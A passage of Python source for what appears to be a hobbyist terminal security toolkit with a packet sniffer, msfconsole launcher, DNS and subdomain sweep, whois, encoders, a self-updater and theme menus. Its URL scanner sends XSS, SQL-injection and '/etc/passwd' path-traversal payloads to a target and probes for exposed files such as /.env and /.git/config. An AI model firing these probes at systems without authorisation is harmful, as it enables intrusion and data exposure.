    launch_flash("msfconsole")
    try:
        subprocess.call([msf])
    except Exception as exc:
        finding("HIGH", "launch failed", str(exc))
    note("leaving msfconsole")

ETH_PROTOS = {0x0800: "IPv4", 0x86DD: "IPv6", 0x0806: "ARP", 0x8100: "VLAN"}
IP_PROTOS = {1: "ICMP", 6: "TCP", 17: "UDP", 2: "IGMP", 47: "GRE", 50: "ESP", 51: "AH"}

def _parse_packet(raw):
    if len(raw) < 14:
        return None
    eth_proto = struct.unpack("!H", raw[12:14])[0]
    if eth_proto == 0x86DD or eth_proto == 0x0806:
        return {"proto": ETH_PROTOS.get(eth_proto, hex(eth_proto)), "src": "?",
                "dst": "?", "sport": None, "dport": None}
    if eth_proto != 0x0800 or len(raw) < 34:
        return None
    ihl = (raw[14] & 0x0F) * 4
    proto = raw[23]
    src = socket.inet_ntoa(raw[26:30])
    dst = socket.inet_ntoa(raw[30:34])
    sport = dport = None
    if proto in (6, 17) and len(raw) >= 14 + ihl + 4:
        sport, dport = struct.unpack("!HH", raw[14 + ihl:14 + ihl + 4])
    return {"proto": IP_PROTOS.get(proto, str(proto)), "src": src, "dst": dst,
            "sport": sport, "dport": dport, "eth": "IPv4"}

def _live_sniff(count, seconds):
    if os.name == "nt":
        finding("MED", "raw capture needs Npcap + admin on windows")
        note("install: https://npcap.com/")
        return
    if not hasattr(socket, "AF_PACKET"):
        finding("HIGH", "AF_PACKET unavailable on this platform")
        return
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                             socket.ntohs(0x0003))
    except PermissionError:
        finding("HIGH", "permission denied", "run as root (sudo)")
        return
    except Exception as exc:
        finding("HIGH", "socket failed", str(exc))
        return
    sock.settimeout(1.0)
    deadline = time.time() + seconds
    seen = 0
    note(f"capture started — {count} packets / {seconds}s — ctrl+c to stop")
    try:
        while seen < count and time.time() < deadline:
            try:
                raw, _addr = sock.recvfrom(65535)
            except socket.timeout:
                continue
            pkt = _parse_packet(raw)
            if not pkt:
                continue
            seen += 1
            s = f"{pkt['src']}:{pkt['sport']}" if pkt["sport"] else pkt["src"]
            d = f"{pkt['dst']}:{pkt['dport']}" if pkt["dport"] else pkt["dst"]
            print("  " + P.pri(f"{seen:04d}") + " " + P.sec(f"{pkt['proto']:<5}")
                  + " " + P.dim(f"{s:<28} -> {d:<28}") + P.dim(f"{len(raw)}B"))
    except KeyboardInterrupt:
        note("capture stopped")
    finally:
        sock.close()
    finding("OK", f"captured {seen} packets")

def _active_connections():
    section("active connections")
    cmd = None
    if shutil.which("ss"):
        cmd = ["ss", "-tunap"]
    elif shutil.which("netstat"):
        cmd = ["netstat", "-tunap"]
    if not cmd:
        finding("MED", "neither ss nor netstat present")
        return
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL,
                                      timeout=10).decode("utf-8", "replace")
        for line in out.splitlines()[:60]:
            print("  " + P.dim(line))
    except Exception as exc:
        finding("MED", "command failed", str(exc))

def _arp_table():
    section("arp / neighbour table")
    for cmd in (["ip", "neigh"], ["arp", "-a"]):
        if shutil.which(cmd[0]):
            try:
                subprocess.call(cmd)
                return
            except Exception:
                continue
    finding("MED", "no arp tool found")

def cmd_sniff(cfg):
    section("packet sniffer")
    print("  " + P.sec("[1]") + " live capture (root)")
    print("  " + P.sec("[2]") + " active connections")
    print("  " + P.sec("[3]") + " arp / neighbour table")
    choice = ask("choice", "1")
    if choice == "2":
        _active_connections()
        return
    if choice == "3":
        _arp_table()
        return
    count = ask("packet count", "40")
    seconds = ask("duration seconds", "20")
    try:
        count = max(1, min(5000, int(count)))
        seconds = max(1, min(600, int(seconds)))
    except ValueError:
        count, seconds = 40, 20
    _live_sniff(count, seconds)

SECURITY_HEADERS = [
    ("Strict-Transport-Security", "LOW"),
    ("Content-Security-Policy", "MED"),
    ("X-Frame-Options", "LOW"),
    ("X-Content-Type-Options", "LOW"),
    ("Referrer-Policy", "LOW"),
    ("Permissions-Policy", "LOW"),
    ("Cross-Origin-Opener-Policy", "LOW"),
]

SENSITIVE_PATHS = [
    ("/.env", "CRIT", r"^[A-Z0-9_]{2,}="),
    ("/.git/config", "CRIT", r"\[core\]"),
    ("/.git/HEAD", "HIGH", r"refs?/"),
    ("/.svn/entries", "HIGH", r"\d+"),
    ("/backup.zip", "HIGH", None),
    ("/backup.sql", "HIGH", None),
    ("/db.sql", "HIGH", None),
    ("/config.php.bak", "HIGH", None),
    ("/phpinfo.php", "MED", r"PHP Version|phpinfo\(\)"),
    ("/server-status", "MED", r"Server Status|Total Accesses"),
    ("/.DS_Store", "LOW", r"Bud1"),
    ("/composer.json", "LOW", r"\"require\""),
    ("/package.json", "LOW", r"\"dependencies\"|\"name\""),
    ("/actuator/env", "HIGH", r"propertySources"),
    ("/actuator/heapdump", "HIGH", None),
    ("/console", "HIGH", r"JDBC|H2 Console"),
    ("/admin", "INFO", r"login|sign in|password"),
    ("/wp-login.php", "INFO", r"wp-submit|user_login"),
    ("/robots.txt", "INFO", r"Disallow|Allow"),
    ("/sitemap.xml", "INFO", r"<urlset"),
    ("/.well-known/security.txt", "INFO", r"Contact:"),
]

SQL_ERROR_RE = re.compile(
    r"(SQL syntax|mysql_?fetch|ORA-\d{5}|PostgreSQL.{0,20}ERROR|"
    r"SQLite/JDBCDriver|Unclosed quotation mark|syntax error at or near|"
    r"SqlException|MySqlException|valid MySQL result|pg_query\(\)|"
    r"Warning.{0,20}mysql_)", re.I)

TRACE_RE = re.compile(
    r"(Traceback \(most recent call last\)|Exception in thread|"
    r"at [\w.$]+\([\w.]+\.java:\d+\)|Stack trace|Fatal error:)")

def _tech_fingerprint(headers, body):
    hits = []
    server = hget(headers, "server")
    if server:
        hits.append(f"server: {server}")
    powered = hget(headers, "x-powered-by")
    if powered:
        hits.append(f"x-powered-by: {powered}")
    markers = {
        "wp-content": "WordPress",
        "wp-includes": "WordPress",
        "__NEXT_DATA__": "Next.js",
        "_next/static": "Next.js",
        "csrfmiddlewaretoken": "Django",
        "django": "Django",
        "laravel_session": "Laravel",
        "XSRF-TOKEN": "Laravel",
        "ng-version": "Angular",
        "react-dom": "React",
        "__VUE__": "Vue",
        "data-v-": "Vue",
        "Shopify.theme": "Shopify",
        "cdn.shopify.com": "Shopify",
        "whmcs": "WHMCS",
        "grafana": "Grafana",
        "jira": "Jira",
        "Jenkins": "Jenkins",
    }
    low = body.lower()
    for marker, tech in markers.items():
        if marker.lower() in low and tech not in hits:
            hits.append(tech)
    cookies = hget(headers, "set-cookie").lower()
    for marker, tech in (("phpsessid", "PHP"), ("jsessionid", "Java"),
                         ("asp.net_sessionid", "ASP.NET"),
                         ("laravel_session", "Laravel")):
        if marker in cookies and tech not in hits:
            hits.append(tech)
    return hits

def _tls_info(host, port=443):
    try:
        ctx = ssl._create_unverified_context()
        with socket.create_connection((host, port), timeout=6) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert() or {}
                version = ssock.version()
                cipher = ssock.cipher()
        issuer = dict(x[0] for x in cert.get("issuer", []))
        subject = dict(x[0] for x in cert.get("subject", []))
        expiry = cert.get("notAfter", "")
        days = None
        if expiry:
            try:
                days = int((ssl.cert_time_to_seconds(expiry) - time.time()) / 86400)
            except Exception:
                days = None
        return {"version": version, "cipher": cipher[0] if cipher else "?",
                "issuer": issuer.get("commonName", issuer.get("organizationName", "?")),
                "subject": subject.get("commonName", "?"),
                "expires": expiry, "days_left": days}
    except Exception as exc:
        return {"error": str(exc)}

def cmd_url_scan(cfg):
    raw = ask("target url")
    if not raw:
        return
    url = normalize_url(raw)
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or ""
    if not host:
        finding("HIGH", "invalid url")
        return
    findings = []

    def add(sev, title, detail=""):
        findings.append({"severity": sev, "title": title, "detail": detail})
        finding(sev, title, detail)

    loading("fetching target")
    resp = http(url, cfg, body_limit=600_000)
    if resp.error:
        add("HIGH", "request failed", resp.error)
        return

    body = resp.text
    headers = resp.headers
    low_body = body.lower()

    section("response")
    kv("final url", resp.url)
    kv("status", resp.status, P.ok if resp.status < 400 else P.warn)
    kv("server", hget(headers, "server", "-"))
    kv("content-type", hget(headers, "content-type", "-"))
    kv("length", f"{len(body)} bytes")
    if resp.history:
        kv("redirects", " -> ".join(resp.history))
    elif resp.status in (301, 302, 303, 307, 308):
        kv("location", hget(headers, "location", "-"), P.warn)

    section("security headers")
    missing = 0
    for header, sev in SECURITY_HEADERS:
        val = hget(headers, header)
        if val:
            print("  " + P.ok(glyph("ok")) + " " + P.dim(f"{header:<32}") + P.dim(val[:48]))
        else:
            missing += 1
            finding(sev, f"missing {header}")
    if not missing:
        finding("OK", "all audited headers present")

    if parsed.scheme == "https":
        section("tls")
        info = _tls_info(host, parsed.port or 443)
        if "error" in info:
            add("MED", "tls inspection failed", info["error"])
        else:
            kv("protocol", info["version"])
            kv("cipher", info["cipher"])
            kv("issuer", info["issuer"])
            kv("expires", f"{info['expires']} ({info['days_left']} days)")
            if info["days_left"] is not None and info["days_left"] < 15:
                add("MED", "certificate expires soon", f"{info['days_left']} days")
    else:
        add("MED", "no https", "served over plain http")

    section("cookies")
    if resp.cookies:
        for c in resp.cookies:
            name = c.split("=", 1)[0].strip()
            flags = []
            lc = c.lower()
            if "secure" in lc:
                flags.append("Secure")
            else:
                add("LOW", f"cookie '{name}' missing Secure")
            if "httponly" in lc:
                flags.append("HttpOnly")
            else:
                add("LOW", f"cookie '{name}' missing HttpOnly")
            if "samesite" in lc:
                flags.append("SameSite")
            else:
                add("LOW", f"cookie '{name}' missing SameSite")
            print("  " + P.sec(name) + P.dim("  " + ", ".join(flags) if flags else ""))
    else:
        note("no set-cookie headers")

    section("fingerprint")
    tech = _tech_fingerprint(headers, body)
    if tech:
        for t in tech:
            print("  " + P.sec("· ") + t)
    else:
        note("nothing conclusive")

    section("passive checks")
    if resp.status >= 500:
        add("MED", "server error on root", f"status {resp.status}")
    if "index of /" in low_body and resp.status == 200:
        add("MED", "directory listing exposed")
    if TRACE_RE.search(body):
        add("LOW", "verbose error / stack trace in response")
    if hget(headers, "x-frame-options") or "frame-ancestors" in low_body:
        pass
    else:
        add("LOW", "clickjacking possible", "no XFO / frame-ancestors")

    origin = "https://nfx-canary.example"
    cors = http(url, cfg, extra_headers={"Origin": origin}, body_limit=1000)
    if not cors.error:
        acao = hget(cors.headers, "access-control-allow-origin")
        acac = hget(cors.headers, "access-control-allow-credentials")
        if acao == origin and acac.lower() == "true":
            add("HIGH", "cors reflected origin with credentials", acao)
        elif acao == origin:
            add("MED", "cors reflects arbitrary origin", acao)
        elif acao == "*":
            add("LOW", "cors wildcard", "*")

    opt = http(url, cfg, method="OPTIONS", body_limit=1000)
    allow = hget(opt.headers, "allow") if not opt.error else ""
    if allow:
        kv("allowed methods", allow)
        for bad in ("PUT", "DELETE", "TRACE", "PATCH"):
            if bad in allow.upper().split(",") or bad in allow.upper():
                add("MED" if bad != "TRACE" else "HIGH", f"method advertised: {bad}")

    base_query = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    param = next(iter(base_query), "q")

    def with_param(name, value):
        q = dict(base_query)
        q[name] = value
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q)))

    section(f"injection probes — param '{param}'")
    xss_canary = 'nfx7f3"><svg/onload=alert(1)>'
    xr = http(with_param(param, xss_canary), cfg, body_limit=400_000)
    if not xr.error and '<svg/onload' in xr.text and "nfx7f3" in xr.text:
        add("HIGH", "reflected xss candidate", f"param '{param}' reflected unencoded")
    else:
        finding("OK", "xss reflection not confirmed")

    sq = http(with_param(param, "nfx'"), cfg, body_limit=400_000)
    if not sq.error and SQL_ERROR_RE.search(sq.text):
        add("HIGH", "sql error disclosure", "quote payload triggered db error")
    else:
        finding("OK", "no sql error signature")

    b1 = http(with_param(param, "nfx' AND '1'='1"), cfg, body_limit=400_000)
    b2 = http(with_param(param, "nfx' AND '1'='2"), cfg, body_limit=400_000)
    if not b1.error and not b2.error:
        delta = abs(len(b1.text) - len(b2.text))
        if delta > 40:
            add("MED", "boolean-based sqli candidate", f"length delta {delta}")

    tr = http(with_param("file", "../../../../../../etc/passwd"), cfg, body_limit=200_000)
    if not tr.error and "root:x:0:0" in tr.text:
        add("CRIT", "path traversal / lfi", "etc/passwd readable")

    for cand in ("url", "next", "redirect", "dest", "continue", "return", "target"):
        rr = http(with_param(cand, "https://example.com/nfcanary"), cfg,
                  allow_redirects=False, body_limit=2000)
        if rr.error:
            continue
        loc = hget(rr.headers, "location")
        if rr.status in (301, 302, 303, 307, 308) and "example.com/nfcanary" in loc:
            add("HIGH", "open redirect", f"param '{cand}'")
            break

    section("exposed paths")
    root = f"{parsed.scheme}://{parsed.netloc}"
    for path, sev, pattern in SENSITIVE_PATHS:
        pr = http(root + path, cfg, body_limit=120_000, timeout=min(6, cfg["timeout"]))
        if pr.error or pr.status not in (200, 401, 403):
            continue
        hit = False
        if pr.status == 200:
            if pattern:
                hit = re.search(pattern, pr.text, re.I) is not None
            else:
                ct = hget(pr.headers, "content-type").lower()
                hit = ("zip" in ct or "sql" in ct or "octet-stream" in ct
                       or pr.text[:2] == "PK")
        if hit:
            add(sev, f"exposed {path}", f"status {pr.status}")
        elif pr.status in (401, 403) and sev in ("CRIT", "HIGH"):
            finding("LOW", f"protected but present {path}", f"status {pr.status}")

    order = {"CRIT": 0, "HIGH": 1, "MED": 2, "LOW": 3, "INFO": 4, "OK": 5}
    findings.sort(key=lambda f: order.get(f["severity"], 9))
    counts = {}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    section("summary")
    print("  " + "   ".join(
        (P.bad if s in ("CRIT", "HIGH") else P.warn if s == "MED" else P.sec)(f"{s}:{counts.get(s, 0)}")
        for s in ("CRIT", "HIGH", "MED", "LOW")
    ))
    if counts.get("CRIT") or counts.get("HIGH"):
        finding("HIGH", "issues worth a second look", "see findings above")
    else:
        finding("OK", "no critical/high findings on this pass")
    save_report(f"urlscan_{host}", {"target": url, "status": resp.status,
                                     "findings": findings,
                                     "tech": tech, "saved": time.time()})

COMMON_SUBS = [
    "www", "mail", "webmail", "smtp", "pop", "imap", "ns1", "ns2", "dns",
    "dev", "staging", "stage", "test", "uat", "prod", "api", "api2", "gateway",
    "admin", "portal", "vpn", "remote", "ftp", "sftp", "cdn", "static",
    "assets", "media", "img", "images", "blog", "shop", "store", "app",
    "mobile", "m", "auth", "sso", "login", "dashboard", "monitor", "status",
    "jenkins", "gitlab", "git", "ci", "registry", "db", "mysql", "redis",
    "vault", "kibana", "grafana", "prometheus", "internal", "intranet",
]

def cmd_dns(cfg):
    domain = ask("domain")
    if not domain:
        return
    domain = domain.replace("http://", "").replace("https://", "").split("/")[0]
    section(f"records — {domain}")
    try:
        name, aliases, addrs = socket.gethostbyname_ex(domain)
        kv("hostname", name)
        kv("a record", ", ".join(addrs), P.ok)
        if aliases:
            kv("aliases", ", ".join(aliases))
        try:
            infos = socket.getaddrinfo(domain, None, socket.AF_INET6)
            v6 = sorted({i[4][0] for i in infos})
            kv("aaaa", ", ".join(v6[:4]))
        except Exception:
            pass
        try:
            kv("reverse", socket.gethostbyaddr(addrs[0])[0])
        except Exception:
            pass
        try:
            kv("mx", subprocess.check_output(["dig", "+short", "MX", domain],
                                             stderr=subprocess.DEVNULL,
                                             timeout=6).decode().strip().replace("\n", ", "))
        except Exception:
            pass
        try:
            txt = subprocess.check_output(["dig", "+short", "TXT", domain],
                                          stderr=subprocess.DEVNULL,
                                          timeout=6).decode().strip()
            if txt:
                kv("txt", txt.replace("\n", " | ")[:120])
        except Exception:
            pass
    except Exception as exc:
        finding("HIGH", "resolution failed", str(exc))

    section("subdomain sweep")
    note("checking common names, this takes a moment")
    found = []

    def check(sub):
        host = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(host)
            return host, ip
        except Exception:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as pool:
        for res in pool.map(check, COMMON_SUBS):
            if res:
                found.append(res)
                print("  " + P.ok(glyph("hit")) + " " + P.sec(f"{res[0]:<40}") + P.dim(res[1]))

    finding("OK" if found else "INFO",
            f"{len(found)} subdomains resolved" if found else "no common subdomains")
    save_report(f"dns_{domain}", {"domain": domain, "found": found})

def _whois(domain):
    def query(server, q):
        with socket.create_connection((server, 43), timeout=8) as sock:
            sock.sendall((q + "\r\n").encode())
            chunks = []
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        return b"".join(chunks).decode("utf-8", "replace")

    tld = domain.split(".")[-1]
    root = query("whois.iana.org", tld)
    server = ""
    for line in root.splitlines():
        if line.lower().startswith("refer:"):
            server = line.split(":", 1)[1].strip()
            break
    if server:
        return query(server, domain)
    return query("whois.iana.org", domain)

def cmd_whois(cfg):
    domain = ask("domain")
    if not domain:
        return
    domain = domain.replace("http://", "").replace("https://", "").split("/")[0]
    loading(f"querying whois for {domain}")
    try:
        text = _whois(domain)
    except Exception as exc:
        finding("HIGH", "whois failed", str(exc))
        return
    if not text.strip():
        finding("MED", "empty whois response")
        return
    section("whois")
    keep = ("domain name", "registrar", "creation date", "updated date",
            "expiry date", "expiration date", "registrant", "name server",
            "status", "dnssec", "org", "organisation", "organization",
            "country", "abuse")
    shown = 0
    for line in text.splitlines():
        if ":" not in line:
            continue
        k, v = line.split(":", 1)
        if any(word in k.strip().lower() for word in keep) and v.strip():
            k = k.strip()
            v = re.sub(r"\s+", " ", v.strip())
            if len(v) > 110:
                v = v[:107] + "..."
            kv(k[:30], v)
            shown += 1
        if shown >= 22:
            break
    save_report(f"whois_{domain}", {"domain": domain, "raw": text})

def cmd_hash(cfg):
    section("hash / encode")
    print("  " + P.sec("[1]") + " hash text (md5/sha1/sha256/sha512)")
    print("  " + P.sec("[2]") + " base64 encode / decode")
    print("  " + P.sec("[3]") + " url encode / decode")
    print("  " + P.sec("[4]") + " hex encode / decode")
    print("  " + P.sec("[5]") + " reverse / rot13")
    choice = ask("choice", "1")
    if choice == "1":
        data = ask("text")
        if not data:
            return
        raw = data.encode()
        section("digests")
        for algo in ("md5", "sha1", "sha256", "sha512"):
            kv(algo, hashlib.new(algo, raw).hexdigest())
    elif choice == "2":
        data = ask("text")
        mode = ask("encode or decode", "encode")
        try:
            if mode.startswith("d"):
                kv("plain", base64.b64decode(data).decode("utf-8", "replace"))
            else:
                kv("b64", base64.b64encode(data.encode()).decode())
        except Exception as exc:
            finding("MED", "base64 failed", str(exc))
    elif choice == "3":
        data = ask("text")
        mode = ask("encode or decode", "encode")
        if mode.startswith("d"):
            kv("plain", urllib.parse.unquote(data))
        else:
            kv("encoded", urllib.parse.quote(data, safe=""))
    elif choice == "4":
        data = ask("text")
        mode = ask("encode or decode", "encode")
        try:
            if mode.startswith("d"):
                kv("plain", binascii.unhexlify(data).decode("utf-8", "replace"))
            else:
                kv("hex", binascii.hexlify(data.encode()).decode())
        except Exception as exc:
            finding("MED", "hex failed", str(exc))
    elif choice == "5":
        data = ask("text")
        kv("reversed", data[::-1])
        kv("rot13", data.translate(str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm")))

UPDATE_REPO = "sqlnxtf0und/foundation"
UPDATE_BRANCH = "main"
UPDATE_MANIFEST = "version.json"
UPDATE_FILES = [
    "main.py", "tools_osint.py", "tools_scan.py", "tools_extra.py",
    "tools_hunt.py", "tools_utils.py", "tools_discord.py",
    "tools_roblox.py", "tools_advanced.py", "tools_system.py",
    "install_pack.py", "requirements.txt",
]

def _version_tuple(text):
    return tuple(int(part) for part in re.findall(r"\d+", str(text))[:3]) or (0,)

def _raw_url(path):
    return (f"https://raw.githubusercontent.com/{UPDATE_REPO}/"
            f"{UPDATE_BRANCH}/{path}")

def fetch_manifest(nf):
    if not UPDATE_REPO or UPDATE_REPO.count("/") != 1:
        return None, "UPDATE_REPO must look like <user>/<repo>"
    r = nf.http(_raw_url(UPDATE_MANIFEST), nf.CFG, body_limit=200_000,
                timeout=max(10, nf.CFG["timeout"]))
    if r.error:
        return None, r.error
    if r.status != 200:
        return None, f"manifest http {r.status} (repo/branch correct?)"
    try:
        data = json.loads(r.text)
    except Exception:
        return None, "manifest is not valid json"
    if not isinstance(data, dict) or "version" not in data:
        return None, "manifest missing version field"
    return data, None

def cmd_update(nf, force=False):
    section("update")
    kv("installed", VERSION)
    kv("channel", f"github:{UPDATE_REPO}@{UPDATE_BRANCH}")
    loading("fetching manifest")
    manifest, error = fetch_manifest(nf)
    if error:
        finding("HIGH", "update check failed", error)
        note("set UPDATE_REPO in main.py to <user>/<repo>")
        return
    remote = str(manifest.get("version", "0"))
    kv("available", remote, P.ok if _version_tuple(remote)[:2] > _version_tuple(VERSION)[:2] else P.sec)
    if manifest.get("notes"):
        for line in str(manifest["notes"]).splitlines()[:6]:
            note(f"  {line}")
    if not force and _version_tuple(remote)[:2] <= _version_tuple(VERSION)[:2]:
        finding("OK", "already on the newest version")
        return
    files = manifest.get("files") or UPDATE_FILES
    if not isinstance(files, list):
        finding("MED", "manifest files field is not a list")
        return
    files = [str(f) for f in files if str(f) in UPDATE_FILES or str(f).startswith("tools_")]
    if not files:
        finding("MED", "manifest lists no updatable files")
        return
    section(f"files to pull ({len(files)})")
    for name in files:
        kv(name, "")
    if ask("apply this update? (y/n)", "n").lower()[:1] != "y":
        note("update cancelled")
        return
    backup_dir = os.path.join(writable_dir("backups"),
                             time.strftime("update-%Y%m%d-%H%M%S"))
    os.makedirs(backup_dir, exist_ok=True)
    written = []
    failed = []
    for name in files:
        r = nf.http(_raw_url(name), nf.CFG, body_limit=4_000_000,
                    timeout=max(15, nf.CFG["timeout"]))
        if r.error or r.status != 200 or not r.text.strip():
            failed.append((name, r.error or f"http {r.status}"))
            continue
        target = os.path.join(BASE_DIR, name)
        try:
            if os.path.isfile(target):
                shutil.copy2(target, os.path.join(backup_dir, name))
            with open(target, "w", encoding="utf-8") as fh:
                fh.write(r.text)
            written.append(name)
            kv("pulled", name, P.ok)
        except Exception as exc:
            failed.append((name, str(exc)[:80]))
    if written:
        loading("verifying new modules")
        broken = []
        for name in written:
            if not name.endswith(".py"):
                continue
            try:
                source = open(os.path.join(BASE_DIR, name), encoding="utf-8").read()
                compile(source, name, "exec")
            except Exception as exc:
                broken.append((name, str(exc)[:100]))
        if broken:
            section("rollback")
            for name, reason in broken:
                finding("HIGH", f"bad update: {name}", reason)
                backup = os.path.join(backup_dir, name)
                if os.path.isfile(backup):
                    shutil.copy2(backup, os.path.join(BASE_DIR, name))
                    note(f"restored {name}")
            finding("MED", "update rolled back — old files kept")
            return
    section("result")
    kv("updated", len(written), P.ok if written else P.warn)
    kv("failed", len(failed), P.bad if failed else P.sec)
    kv("backup", backup_dir)
    for name, reason in failed:
        finding("MED", f"skipped {name}", reason)
    if written:
        finding("OK", "update applied")
        offer_restart(nf)

def cmd_apikeys(nf):
    cfg = getattr(nf, "CFG", nf) if not isinstance(nf, dict) else nf
    while True:
        clear()
        show_header("api keys")
        section(f"key store — {apikeys.ENV_PATH}")
        names = list(apikeys.ORDER)
        for i, name in enumerate(names, 1):
            spec = apikeys.SPECS[name]
            on = KEYS.available(name)
            kv(f"{i:>2} {spec['label']}", "set" if on else "not set",
               P.ok if on else P.dim)
        relay = apikeys.relay_config()
        section("relay")
        kv("url", relay["url"] or "not set",
           P.ok if relay["url"] else P.dim)
        kv("token", "set" if relay["token"] else "not set",
           P.ok if relay["token"] else P.dim)
        kv("transport", "relay" if apikeys.relay_enabled() else "direct")
        kv(" r  configure relay", "")
        kv(" c  clear response cache", "")
        kv(" 0  back", "")
        note("relay takes precedence; keys stay on the relay host")
        choice = ask("service")
        if choice in ("", "0"):
            return
        if choice.lower() == "r":
            clear()
            show_header("relay")
            note("leave a field blank to keep the current value")
            url = ask(f"relay url [{relay['url'] or 'not set'}]")
            token = ask("relay token [hidden]")
            updates = {}
            if url:
                updates[apikeys.RELAY_URL_VAR] = url.rstrip("/")
            if token:
                updates[apikeys.RELAY_TOKEN_VAR] = token
            if updates:
                apikeys.write_env(updates)
                KEYS.reload()
            loading("saved")
            continue
        if choice.lower() == "c":
            removed = apikeys.clear_cache()
            note(f"removed {removed} cached response(s)")
            pause()
            continue
        if not choice.isdigit() or not (1 <= int(choice) <= len(names)):
            note("no such service")
            pause()
            continue
        name = names[int(choice) - 1]
        spec = apikeys.SPECS[name]
        clear()
        show_header(spec["label"])
        note(spec.get("hint", ""))
        note("ignored while the relay is active")
        for var in spec["env"]:
            current = os.environ.get(var, "")
            prompt = var + (" [set — blank keeps current]" if current else "")
            value = ask(prompt)
            if value:
                apikeys.write_env({var: value})
        KEYS.reload()
        loading("saved")

THEME_GROUPS = {
    "dark": ("lightblue", "bloody_red", "pitchblack", "matrix", "cyber", "nord",
             "dracula", "tokyo", "synthwave", "gruvbox", "catppuccin", "monokai",
             "rose_pine", "neon", "blood_moon", "violet", "grayscale"),
    "light": ("solarized", "ice", "amber", "mocha", "ocean"),
    "nature": ("forest", "ember", "sunset"),
}


def apply_live(cfg):
    """Push a settings change into the live renderer immediately."""
    P.set(cfg.get("theme", "lightblue"))


def pick_theme(cfg):
    clear()
    show_header("theme gallery")
    idx = 0
    for group, names in THEME_GROUPS.items():
        print()
        print("  " + P.dim(group))
        for name in names:
            idx += 1
            print("  " + P.pri(f"[{idx:>2}]") + " " +
                  P.sec(f"{name:<16}") + swatch(THEMES[name]))
    idx += 1
    print()
    print("  " + P.pri(f"[{idx:>2}]") + " " + P.sec(f"{'custom':<16}") +
          swatch(theme_colors("custom")))
    print()
    val = ask("theme (number or name, b = back)", cfg.get("theme", "lightblue"))
    all_names = [n for names in THEME_GROUPS.values() for n in names] + ["custom"]
    if val.isdigit() and 1 <= int(val) <= len(all_names):
        cfg["theme"] = all_names[int(val) - 1]
    elif val in all_names:
        cfg["theme"] = val
    else:
        note("kept previous theme")
    apply_live(cfg)


def pick_custom_colors(cfg):
    slots = (("pri", "primary"), ("sec", "secondary"), ("dim", "muted"),
             ("ok", "success"), ("warn", "warning"), ("bad", "error"))
    while True:
        clear()
        show_header("custom palette")
        for i, (slot, label) in enumerate(slots, 1):
            hexv = cfg["custom_colors"][slot]
            rgb = hex_to_rgb(hexv)
            print("  " + P.pri(f"[{i}]") + " " + P.sec(f"{label:<12}") +
                  f"{hexv}  " + P.rgb(rgb, "██████"))
        print()
        print("  " + P.pri("[7]") + " activate custom theme")
        print("  " + P.pri("[8]") + " seed from current theme")
        print("  " + P.pri("[9]") + " hex colour picker")
        print("  " + P.pri("[0]") + " back")
        choice = ask("slot")
        if choice in ("", "0"):
            save_settings(cfg)
            return
        if choice in {str(i) for i in range(1, 7)}:
            slot = slots[int(choice) - 1][0]
            val = ask("hex (#rrggbb)", cfg["custom_colors"][slot])
            if is_hex(val):
                cfg["custom_colors"][slot] = val.lower()
            else:
                note("invalid hex — kept previous")
        elif choice == "7":
            cfg["theme"] = "custom"
            note("custom theme active")
        elif choice == "8":
            base = theme_colors(cfg.get("theme", "lightblue"))
            for (slot, _label), rgb in zip(slots, base):
                cfg["custom_colors"][slot] = rgb_to_hex(rgb)
            note("palette seeded from theme")
        elif choice == "9":
            pick_hex_live(cfg, slots)
        apply_live(cfg)
        save_settings(cfg)


def pick_hex_live(cfg, slots):
    """Arrow-free channel walk: adjust r/g/b for one slot with live preview."""
    clear()
    show_header("colour picker")
    for i, (slot, label) in enumerate(slots, 1):
        print("  " + P.pri(f"[{i}]") + " " + P.sec(f"{label:<12}") +
              cfg["custom_colors"][slot])
    val = ask("slot to tune")
    if not (val.isdigit() and 1 <= int(val) <= len(slots)):
        return
    slot = slots[int(val) - 1][0]
    rgb = hex_to_rgb(cfg["custom_colors"][slot])
    while True:
        cfg["custom_colors"][slot] = rgb_to_hex(rgb)
        apply_live(cfg)
        clear()
        show_header(f"tuning {slot}")
        print("  " + P.rgb(rgb, "████████████████████"))
        print()
        print("  " + P.pri("r/g/b") + " " + P.dim(f"{rgb[0]:>3} {rgb[1]:>3} {rgb[2]:>3}"))
        print("  " + P.pri("[1]") + " red   " + P.pri("[2]") + " green   " +
              P.pri("[3]") + " blue   " + P.pri("[0]") + " done")
        ch = ask("channel")
        if ch in ("", "0"):
            save_settings(cfg)
            return
        if ch not in ("1", "2", "3"):
            note("pick 1, 2, 3 or 0")
            continue
        idx = int(ch) - 1
        amt = ask("delta (-255..255)", "16")
        try:
            delta = int(amt)
        except ValueError:
            note(f"'{amt}' is not a number — unchanged")
            continue
        if not -255 <= delta <= 255:
            note("delta out of range — unchanged")
            continue
        as_list = list(rgb)
        as_list[idx] = max(0, min(255, as_list[idx] + delta))
        rgb = tuple(as_list)


def pick_font(cfg):
    names = list(FONTS)
    print()
    for i, name in enumerate(names, 1):
        sample = "\033[" + (FONTS[name] or "0") + "m" + name + "\033[0m" if FONTS[name] else name
        print("  " + P.pri(f"[{i}]") + " " + P.sec(sample))
    val = ask("font", cfg.get("font", "default"))
    if val.isdigit() and 1 <= int(val) <= len(names):
        cfg["font"] = names[int(val) - 1]
    elif val in FONTS:
        cfg["font"] = val
    else:
        note("kept previous font")


def cycle(cfg, key, options):
    opts = tuple(options)
    try:
        cur = opts.index(cfg.get(key))
    except ValueError:
        cur = 0
    cfg[key] = opts[(cur + 1) % len(opts)]
    return cfg[key]


def settings_labels(cfg):
    """Built fresh on every render so the menu always shows live values."""
    return {
        "1": ("animations", "on" if cfg["animations"] else "off"),
        "2": ("animation style", cfg.get("anim_style", "typewriter")),
        "3": ("speed", f"{cfg['anim_speed']}x"),
        "4": ("theme", cfg["theme"]),
